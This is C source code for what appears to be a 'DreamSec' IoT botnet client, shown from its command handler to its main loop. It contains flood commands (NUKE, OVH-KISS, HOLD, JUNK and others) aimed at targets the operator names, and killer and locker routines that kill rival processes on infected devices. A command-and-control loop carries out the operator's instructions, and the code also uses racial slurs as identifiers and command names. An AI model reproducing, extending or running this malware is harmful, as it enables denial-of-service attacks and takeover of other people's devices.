    if(!strcmp(argv[0], "CHARGEN"))
        {
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *niggas = strtok(ip, ",");
            while(niggas != NULL)
            {
                if(!listFork())
                {
                    SendSTDHEX(niggas, port, time);
                    _exit(0);
                }
                niggas = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            SendSTDHEX(ip, port, time);
            _exit(0);
        }
    }   //RyRdm9/

    if(!strcmp(argv[0], "RIP"))
        {
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *niggas = strtok(ip, ",");
            while(niggas != NULL)
            {
                if(!listFork())
                {
                    SendSTDHEX(niggas, port, time);
                    _exit(0);
                }
                niggas = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            SendSTDHEX(ip, port, time);
            _exit(0);
        }
    }   //RyRdm9/

    if(!strcmp(argv[0], "KILLALL"))
        {
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *niggas = strtok(ip, ",");
            while(niggas != NULL)
            {
                if(!listFork())
                {
                    SendSTDHEX(niggas, port, time);
                    _exit(0);
                }
                niggas = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            SendSTDHEX(ip, port, time);
            _exit(0);
        }
    }   //RyRdm9/

    if(!strcmp(argv[0], "ZAP"))
        {
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *niggas = strtok(ip, ",");
            while(niggas != NULL)
            {
                if(!listFork())
                {
                    SendSTDHEX(niggas, port, time);
                    _exit(0);
                }
                niggas = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            SendSTDHEX(ip, port, time);
            _exit(0);
        }
    }   //RyRdm9/

    if(!strcmp(argv[0], "DEATH"))
        {
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *niggas = strtok(ip, ",");
            while(niggas != NULL)
            {
                if(!listFork())
                {
                    SendSTDHEX(niggas, port, time);
                    _exit(0);
                }
                niggas = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            SendSTDHEX(ip, port, time);
            _exit(0);
        }
    }   //RyRdm9/

    if(!strcmp(argv[0], "KKK"))
        {
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *niggas = strtok(ip, ",");
            while(niggas != NULL)
            {
                if(!listFork())
                {
                    SendSTDHEX(niggas, port, time);
                    _exit(0);
                }
                niggas = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            SendSTDHEX(ip, port, time);
            _exit(0);
        }
    }


if(!strcmp(argv[0], "NUKE"))
        {
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *niggas = strtok(ip, ",");
            while(niggas != NULL)
            {
                if(!listFork())
                {
                    SendSTDHEX(niggas, port, time);
                    _exit(0);
                }
                niggas = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            SendSTDHEX(ip, port, time);
            _exit(0);
        }
    }



    if (!strcmp(argv[0], "OVH-KISS"))
    {
        if (argc < 4 || atoi(argv[2]) > 10000 || atoi(argv[3]) < 1) return;
        if (listFork()) return;
        ovhl7(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]));
        exit(0);
    }//Ends Here Nicca

    if (!strcmp(argv[0], "SLAP-OVH"))
    {
        if (argc < 4 || atoi(argv[2]) > 10000 || atoi(argv[3]) < 1) return;
        if (listFork()) return;
        ovhl7(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]));
        exit(0);
    }//Ends Here Nicca

    if (!strcmp(argv[0], "VPN-NULL"))
    {
        if (argc < 4 || atoi(argv[2]) > 10000 || atoi(argv[3]) < 1) return;
        if (listFork()) return;
        ovhl7(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]));
        exit(0);
    }//Ends Here Nicca

    if (!strcmp(argv[0], "NFO"))
    {
        if (argc < 4 || atoi(argv[2]) > 10000 || atoi(argv[3]) < 1) return;
        if (listFork()) return;
        ovhl7(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]));
        exit(0);
    }//Ends Here Nicca
    if (!strcmp(argv[0], "HYDRA"))
    {
        if (argc < 4 || atoi(argv[2]) > 10000 || atoi(argv[3]) < 1) return;
        if (listFork()) return;
        ovhl7(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]));
        exit(0);
    }//Ends Here Nicca

    if(!strcmp(argv[0], "HOLD"))
        {
                if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
                {
                        //sockprintf(mainCommSock, "HOLD <ip> <port> <time>");
                        return;
                }

                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);

                if(strstr(ip, ",") != NULL)
                {
                        unsigned char *hi = strtok(ip, ",");
                        while(hi != NULL)
                        {
                                if(!listFork())
                                {
                                        sendHOLD(hi, port, time);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                } else {
                        if (listFork()) { return; }

                        sendHOLD(ip, port, time);
                        _exit(0);
                }
        }

    if(!strcmp(argv[0], "JUNK"))
        {
                if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
                {
                        //sockprintf(mainCommSock, "JUNK <ip> <port> <time>");
                        return;
                }

                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);

                if(strstr(ip, ",") != NULL)
                {
                        unsigned char *hi = strtok(ip, ",");
                        while(hi != NULL)
                        {
                                if(!listFork())
                                {
                                        sendJUNK(hi, port, time);
                                        close(mainCommSock);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                } else {
                        if (listFork()) { return; }

                        sendJUNK(ip, port, time);
                        _exit(0);
                }
        }
	
        if(!strcmp(argv[0], "STOP"))
		{
                int killed = 0;
                unsigned long i;
                for (i = 0; i < numpids; i++)
				{
                        if (pids[i] != 0 && pids[i] != getpid())
						{
                                kill(pids[i], 9);
                                killed++;
                        }
                }
                if(killed > 0)
				{
					
                } else {
							
					   }
        }

        if(!strcmp(argv[0], "stop"))
		{
                int killed = 0;
                unsigned long i;
                for (i = 0; i < numpids; i++)
				{
                        if (pids[i] != 0 && pids[i] != getpid())
						{
                                kill(pids[i], 9);
                                killed++;
                        }
                }
                if(killed > 0)
				{
					
                } else {
							
					   }
        }

        if(!strcmp(argv[0], "Stop"))
		{
                int killed = 0;
                unsigned long i;
                for (i = 0; i < numpids; i++)
				{
                        if (pids[i] != 0 && pids[i] != getpid() && pids[i] != killer_pid)
						{
                                kill(pids[i], 9);
                                killed++;
                        }
                }
                if(killed > 0)
				{
					
                } else {
							
					   }
        }
}//RyRdm9
#include <dirent.h>
typedef struct lock_t {
    int val;

    struct lock_t *prev, *next;
} Lock;

typedef struct killed_t {
    int pid;

    char realpath[256];

    struct killed_t *prev, *next;
} Kill;

#define RESCAN_LOOP_TIMES 4096

static Kill *kill_head = NULL;
static Lock *lock_head = NULL;

int util_isdigit(char c) {
    return (c >= '0' && c <= '9');
}

char *paths[] = {
    "ZG9z",
    "var/Challenge",
    "app/hi3511",
    "gmDVR",
    "usr/dvr_main _8182T_1108",
    "mnt/mtd/app/gui",
    "var/Kylin",
    "anko-app/ankosample _8182T_1104",
    "var/tmp/sonia",
    "hicore",
    "stm_hi3511_dvr",
    "usr/",
    "shell",
    "mnt/",
    "sys/",
    "bin/",
    "boot/",
    "media/",
    "srv/",
    "var/run/",
    "sbin/",
    "lib/",
    "etc/",
    "dev/",
    "home/Davinci",
    "watchdog",
    "/var/spool",
    "/var/Sofia",
    "sshd",
    "bash",
    "httpd",
    "telnetd",
    "dropbear",
    "ropbear",
    "system",
    "/root/dvr_gui/",
    "/root/dvr_app/",
    "/anko-app/",
    "/opt/"
};

static void append_list(Kill *info) {
    Kill *last = kill_head, *node = calloc(1, sizeof(Kill));

    node->pid = info->pid;
    strcpy(node->realpath, info->realpath);

    if(kill_head == NULL) { //if there are no items
        node->prev = NULL; //if this is the first structure we dont have a previous
        kill_head = node; //set header to our node because its the first

        return;
    }

    while(last->next != NULL) //go through the linked list to find the most recent structure added
        last = last->next;
    
    last->next = node;  //set the next one from our most recent to our new node
    node->prev = last;  //set the set our new nodes previous to the old most recent structure
}

static Kill *remove_list(Kill *del) {
    Kill *ret;

    if(kill_head == NULL || del == NULL) //dont wanna fuck with null shit
        return NULL;
    
    if(del == kill_head) { //if we are deleting our header structure
        kill_head = kill_head->next; //set our header structure to the structure after header

        kill_head->prev = NULL; //set the new header to null
    }
    else
        del->prev->next = del->next; //move the deleted nodes next one to the structure after
    
    free(del);

    ret = del->next; //return the new current node

    return ret;
}

Kill *search_list(char *realpath) {
    Kill *node = kill_head;

    while (node != NULL) {
        if(!strcmp(node->realpath, realpath))
            return node;

        node = node->next;
    }

    return NULL;
}

static char check_whitelist(char *self, char *realpath) {
    if(!strcmp(self, realpath))
        return 1;

    if(strstr(realpath, "/wget") ||
       strstr(realpath, "/tftp") || 
       strstr(realpath, "/curl") ||
       strstr(realpath, "/reboot"))
        return 0;

    int size = sizeof(paths)/sizeof(paths[0]);
    while(size--) {
        if(strstr(realpath, paths[size]))
            return 1;
    }

    return 0;
}

void locker();

void killer() {
    if(fork() > 0)
        return;

    DIR *proc;

    if((proc = opendir("/proc")) == NULL)
        return;
    
    struct dirent *files;
    char path[64], rdbuf[256];

    Kill self; //just in case we want to use this info in other places

    readlink("/proc/self/exe", self.realpath, sizeof(self.realpath));
    self.pid = getpid();

    //while(1) {
        while((files = readdir(proc))) {
            if(!util_isdigit(*(files->d_name)))
                continue;

            memset(rdbuf, 0, sizeof(rdbuf));
            
            strcpy(path, "/proc/");
            strcat(path, files->d_name);
            strcat(path, "/exe");

            if(readlink(path, rdbuf, sizeof(rdbuf)) == -1)
                continue;

            Kill *node;
            if((node = search_list(rdbuf)) != NULL) {
#ifdef DEBUG
                printf("[killer] found [%d] [%s] in kill list - killing [%s]\r\n", node->pid, node->realpath, files->d_name);
#endif
                kill(atoi(files->d_name), 9);

                continue;
            }
            
            if(check_whitelist(self.realpath, rdbuf))
                continue;

            Kill info;

            info.pid = atoi(files->d_name);
            strcpy(info.realpath, rdbuf);

            append_list(&info);

#ifdef DEBUG
            printf("[killer] added [%d] [%s] to kill list\r\n", info.pid, info.realpath);
#endif

            kill(atoi(files->d_name), 9);
        }

        //usleep(10000);
        //rewinddir(proc);
    //}

    locker();
}

int get_realpath(char *pid, char *rdbuf, int len) {
    char path[64];

    memset(rdbuf, 0, len);
            
    strcpy(path, "/proc/");
    strcat(path, pid);
    strcat(path, "/exe");

    return readlink(path, rdbuf, len - 1);
} 


Lock *lock_append_list(int val) {
    Lock *last = lock_head, *node = calloc(1, sizeof(Lock));

    node->val = val;
    node->next = NULL;

    if(lock_head == NULL) {
        node->prev = NULL;
        lock_head = node;

        return lock_head;
    }

    while(last->next != NULL)
        last = last->next;
    
    last->next = node;
    node->prev = last;

    return node;
}

int lock_search_list(int val) {
    Lock *node = lock_head;

    while(node != NULL) {
        if(node->val == val)
             return 1;
        
        node = node->next;
    }

    return 0;
}

Lock *lock_remove_list(Lock *del) {
    Lock *ret;

    if(lock_head == NULL || del == NULL)
        return NULL;
    
    if(del == lock_head) {
        lock_head = lock_head->next;

        lock_head->prev = NULL;
    }
    else
        del->prev->next = del->next;
    
    free(del);

    ret = del->next;

    return ret;
}

void remove_all() {
    Lock *last_node = lock_head;

    while(last_node->next != NULL)
        last_node = last_node->next;

    while(last_node->prev != NULL) {
        lock_remove_list(last_node);

        last_node = last_node->prev;
    }
}

Lock *scan(DIR *proc) {
    Lock *node;
    struct dirent *files;

    rewinddir(proc);

    if(lock_head != NULL)
        remove_all();

    while((files = readdir(proc))) {
        if(!util_isdigit(*(files->d_name)))
            continue;
        
        node = lock_append_list(atoi(files->d_name));
    }

    return node;
}

void locker(char *self) {
    DIR *proc;
    if((proc = opendir("/proc/")) == NULL)
        return;
    
    int loop_times;
    
    Kill *kill_node;
    Lock *node = scan(proc);
    struct dirent *files;

    char rdbuf[256];

#ifdef DEBUG
    printf("[locker] started!\n");
#endif

    while(1) {
        while((files = readdir(proc))) {
            if(atoi(files->d_name) < node->val)
                continue;

            else if(get_realpath(files->d_name, rdbuf, sizeof(rdbuf)) == -1)
                continue;

            
            if(check_whitelist(self, rdbuf))
                continue;

            kill(atoi(files->d_name), 9);
        }

        if(loop_times++ > RESCAN_LOOP_TIMES) {
            node = scan(proc);

            loop_times = 0;
        }

        rewinddir(proc);
#ifdef x86_64
        usleep(1000);
#else
        sleep(1);
#endif
    }
}


int initConnection()
{
        unsigned char server[512];
        memset(server, 0, 512);
        if(mainCommSock) { close(mainCommSock); mainCommSock = 0; }
        if(currentServer + 1 == SERVER_LIST_SIZE) currentServer = 0;
        else currentServer++;

        strcpy(server, commServer[currentServer]);
        int port = 6982;
        if(strchr(server, ':') != NULL)
        {
                port = atoi(strchr(server, ':') + 1);
                *((unsigned char *)(strchr(server, ':'))) = 0x0;
        }

        mainCommSock = socket(AF_INET, SOCK_STREAM, 0);

        if(!connectTimeout(mainCommSock, server, port, 30)) return 1;

        return 0;
}

int main(int argc, unsigned char *argv[])
{
        if(SERVER_LIST_SIZE <= 0) return 0;

        srand(time(NULL) ^ getpid());
        init_rand(time(NULL) ^ getpid());
        getOurIP();
        pid_t pid1;
        pid_t pid2;
        int status;

        if (pid1 = fork()) {
                        waitpid(pid1, &status, 0);
                        exit(0);
        } else if (!pid1) {
                        if (pid2 = fork()) {
                                        exit(0);
                        } else if (!pid2) {
                        } else {
                        }
        } else {
        }

        killer();
        setsid();
        chdir("/");
        signal(SIGPIPE, SIG_IGN);

        while(1)
        {
                if(initConnection()) { sleep(5); continue; }
                sockprintf(mainCommSock, "\e[0m[\e[1;31mDreamSec.\e[0m][\e[1;31m%s\e[0m]\e[1;31m:\e[0m[\e[1;31m%s\e[0m] \e[1;31m>\e[0m [\e[1;31m%s\e[0m]", inet_ntoa(ourIP), getPortz(), getArch());
                char commBuf[4096];
                int got = 0;
                int i = 0;
                while((got = recvLine(mainCommSock, commBuf, 4096)) != -1)
                {
                        for (i = 0; i < numpids; i++) if (waitpid(pids[i], NULL, WNOHANG) > 0) {
                                unsigned int *newpids, on;
                                for (on = i + 1; on < numpids; on++) pids[on-1] = pids[on];
                                pids[on - 1] = 0;
                                numpids--;
                                newpids = (unsigned int*)malloc((numpids + 1) * sizeof(unsigned int));
                                for (on = 0; on < numpids; on++) newpids[on] = pids[on];
                                free(pids);
                                pids = newpids;
                        }

                        commBuf[got] = 0x00;

                        trim(commBuf);
                        
                        unsigned char *message = commBuf;

                        if(*message == '!')
                        {
                                unsigned char *nickMask = message + 1;
                                while(*nickMask != ' ' && *nickMask != 0x00) nickMask++;
                                if(*nickMask == 0x00) continue;
                                *(nickMask) = 0x00;
                                nickMask = message + 1;

                                message = message + strlen(nickMask) + 2;
                                while(message[strlen(message) - 1] == '\n' || message[strlen(message) - 1] == '\r') message[strlen(message) - 1] = 0x00;

                                unsigned char *command = message;
                                while(*message != ' ' && *message != 0x00) message++;
                                *message = 0x00;
                                message++;

                                unsigned char *tmpcommand = command;
                                while(*tmpcommand) { *tmpcommand = toupper(*tmpcommand); tmpcommand++; }

                                unsigned char *params[10];
                                int paramsCount = 1;
                                unsigned char *pch = strtok(message, " ");/*RY*/
                                params[0] = command;

                                while(pch)
                                {
                                        if(*pch != '\n')
                                        {
                                                params[paramsCount] = (unsigned char *)malloc(strlen(pch) + 1);
                                                memset(params[paramsCount], 0, strlen(pch) + 1);
                                                strcpy(params[paramsCount], pch);
                                                paramsCount++;
                                        }
                                        pch = strtok(NULL, " ");
                                }

                                processCmd(paramsCount, params);

                                if(paramsCount > 1)
                                {
                                        int q = 1;
                                        for(q = 1; q < paramsCount; q++)
                                        {
                                                free(params[q]);
                                        }
                                }
                        }
                }
        }

        return 0;
}
